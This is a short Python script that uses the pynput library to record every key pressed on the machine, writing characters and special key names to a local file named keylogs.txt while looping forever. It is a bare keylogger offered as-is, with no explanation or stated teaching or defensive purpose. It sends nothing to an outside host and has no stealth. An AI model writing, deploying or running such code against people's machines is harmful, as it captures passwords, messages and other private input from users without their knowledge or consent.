from pynput import keyboard

def keyPressed(key):
    print(str(key) + 'aaa')
    try:
        with open("keylogs.txt", "a") as logKey:
            try:
                text = key.char
                logKey.write(text)
            except AttributeError:
                print("Special key pressed..")
                logKey.write('[' + key.name + ']')
            logKey.write('\n')
    except Exception as e:
        print(e)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    while True:
        pass
